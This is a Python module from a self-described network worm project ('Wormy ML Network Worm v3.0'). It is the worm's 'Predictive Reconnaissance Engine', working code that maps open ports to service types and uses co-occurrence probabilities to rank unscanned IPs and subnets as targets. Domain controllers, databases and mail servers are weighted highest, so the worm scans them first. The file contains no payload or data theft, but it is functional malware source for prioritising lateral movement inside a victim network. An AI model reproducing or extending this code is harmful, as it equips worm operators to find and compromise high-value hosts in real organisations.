"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Predictive Reconnaissance Engine
Bayesian neighborhood analysis that predicts where high-value targets are
based on services found in neighboring hosts.

Instead of scanning randomly, the worm predicts:
- If a DB server is found → likely an app server nearby
- If a DC is found → likely member workstations in same subnet
- If a web server is found → likely a load balancer or reverse proxy
"""

import math
import os
import sys
from collections import defaultdict
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class BayesianNetworkAnalyzer:
    """
    Bayesian analysis of network topology to predict target locations

    Uses conditional probability: P(Target | Neighbor) to predict
    where high-value hosts are likely to be found.
    """

    # Service co-occurrence priors (based on real network architectures)
    SERVICE_CORRELATIONS = {
        # If we find a DB server, these are likely nearby
        "database": {
            "app_server": 0.85,
            "web_server": 0.70,
            "backup_server": 0.60,
            "domain_controller": 0.30,
        },
        # If we find a DC, these are likely nearby
        "domain_controller": {
            "workstation": 0.95,
            "file_server": 0.80,
            "exchange_server": 0.60,
            "dns_server": 0.90,
        },
        # If we find a web server, these are likely nearby
        "web_server": {
            "app_server": 0.75,
            "database": 0.65,
            "load_balancer": 0.50,
            "cdn_proxy": 0.40,
        },
        # If we find an app server, these are likely nearby
        "app_server": {
            "database": 0.80,
            "web_server": 0.60,
            "message_queue": 0.50,
            "cache_server": 0.55,
        },
        # If we find a file server, these are likely nearby
        "file_server": {
            "domain_controller": 0.70,
            "backup_server": 0.65,
            "workstation": 0.80,
            "print_server": 0.40,
        },
    }

    # Port-to-service-type mapping
    PORT_SERVICE_MAP = {
        3306: "database",
        5432: "database",
        1433: "database",
        6379: "database",
        27017: "database",
        9200: "database",
        88: "domain_controller",
        389: "domain_controller",
        636: "domain_controller",
        80: "web_server",
        443: "web_server",
        8080: "web_server",
        8443: "web_server",
        8000: "app_server",
        8001: "app_server",
        9000: "app_server",
        9090: "app_server",
        135: "domain_controller",
        139: "file_server",
        445: "file_server",
        53: "dns_server",
        25: "exchange_server",
        587: "exchange_server",
        5900: "workstation",
        3389: "workstation",
        631: "print_server",
        11211: "cache_server",
        5672: "message_queue",
        15672: "message_queue",
    }

    def __init__(self):
        self.discovered_services: Dict[str, List[str]] = defaultdict(list)
        self.subnet_profiles: Dict[str, Dict[str, int]] = defaultdict(lambda: defaultdict(int))
        self.predictions: Dict[str, float] = {}
        self.scan_history: List[Dict] = []

    def register_host(self, ip: str, ports: List[int], os_guess: str = "Unknown"):
        """Register a discovered host and update Bayesian model"""
        subnet = ".".join(ip.split(".")[:3])
        services = self._ports_to_services(ports)

        self.discovered_services[ip] = services
        for svc in services:
            self.subnet_profiles[subnet][svc] += 1

        self.scan_history.append(
            {
                "ip": ip,
                "subnet": subnet,
                "services": services,
                "os": os_guess,
            }
        )

        # Update predictions based on this host
        self._update_predictions(ip, subnet, services)

    def _ports_to_services(self, ports: List[int]) -> List[str]:
        """Map ports to service types"""
        services = []
        for port in ports:
            if port in self.PORT_SERVICE_MAP:
                svc = self.PORT_SERVICE_MAP[port]
                if svc not in services:
                    services.append(svc)
        return services

    def _update_predictions(self, ip: str, subnet: str, services: List[str]):
        """Update Bayesian predictions based on newly discovered services"""
        for svc in services:
            if svc in self.SERVICE_CORRELATIONS:
                correlations = self.SERVICE_CORRELATIONS[svc]
                for predicted_svc, probability in correlations.items():
                    # Adjust probability based on subnet density
                    subnet_count = self.subnet_profiles[subnet].get(predicted_svc, 0)
                    density_factor = min(1.0, subnet_count / 5.0)

                    # Bayesian update: P(A|B) = P(B|A) * P(A) / P(B)
                    prior = 0.1  # Default prior probability
                    likelihood = probability
                    evidence = max(0.01, subnet_count / max(len(self.scan_history), 1))

                    posterior = (likelihood * prior) / max(evidence, 0.01)
                    posterior = min(1.0, posterior * (1 + density_factor))

                    # Generate predicted IP range
                    for i in range(1, 255):
                        predicted_ip = f"{subnet}.{i}"
                        if predicted_ip not in self.discovered_services:
                            current = self.predictions.get(predicted_ip, 0.0)
                            self.predictions[predicted_ip] = max(current, posterior * 0.5)

    def get_priority_targets(self, limit: int = 20) -> List[Tuple[str, float]]:
        """Get IPs sorted by predicted value (highest probability first)"""
        # Filter out already discovered hosts
        unknown_predictions = {
            ip: score
            for ip, score in self.predictions.items()
            if ip not in self.discovered_services
        }

        # Sort by score descending
        sorted_targets = sorted(unknown_predictions.items(), key=lambda x: x[1], reverse=True)
        return sorted_targets[:limit]

    def get_subnet_priority(self) -> List[Tuple[str, float]]:
        """Get subnets sorted by predicted value"""
        subnet_scores = {}
        for subnet, profile in self.subnet_profiles.items():
            score = 0
            for svc, count in profile.items():
                # High-value services get more weight
                weights = {
                    "domain_controller": 10,
                    "database": 8,
                    "app_server": 6,
                    "file_server": 5,
                    "web_server": 4,
                    "exchange_server": 7,
                    "backup_server": 6,
                    "workstation": 2,
                }
                score += count * weights.get(svc, 1)
            subnet_scores[subnet] = score

        return sorted(subnet_scores.items(), key=lambda x: x[1], reverse=True)

    def get_statistics(self) -> Dict:
        """Get analysis statistics"""
        total_services = sum(len(svcs) for svcs in self.discovered_services.values())
        return {
            "hosts_analyzed": len(self.discovered_services),
            "total_services_found": total_services,
            "subnets_profiled": len(self.subnet_profiles),
            "predictions_made": len(self.predictions),
            "top_predicted_targets": self.get_priority_targets(5),
            "top_priority_subnets": self.get_subnet_priority()[:5],
        }


class PredictiveScanner:
    """
    Scanner that uses Bayesian analysis to prioritize scan targets

    Instead of scanning sequentially, it:
    1. Scans a seed host
    2. Analyzes services found
    3. Predicts where high-value targets are
    4. Prioritizes scanning those predictions
    """

    def __init__(self):
        self.analyzer = BayesianNetworkAnalyzer()
        self.scanned_ips = set()
        self.discovered_hosts = []

    def analyze_and_prioritize(self, ip: str, ports: List[int], os_guess: str = "Unknown"):
        """Analyze a host and update scan priorities"""
        self.analyzer.register_host(ip, ports, os_guess)
        self.scanned_ips.add(ip)
        self.discovered_hosts.append(
            {
                "ip": ip,
                "ports": ports,
                "os": os_guess,
            }
        )

    def get_next_targets(self, limit: int = 10) -> List[Tuple[str, float]]:
        """Get next IPs to scan, prioritized by predicted value"""
        return self.analyzer.get_priority_targets(limit)

    def get_scan_plan(self) -> Dict:
        """Get a complete scan plan with priorities"""
        return {
            "discovered": self.discovered_hosts,
            "predicted_targets": self.analyzer.get_priority_targets(20),
            "subnet_priorities": self.analyzer.get_subnet_priority(),
            "statistics": self.analyzer.get_statistics(),
        }
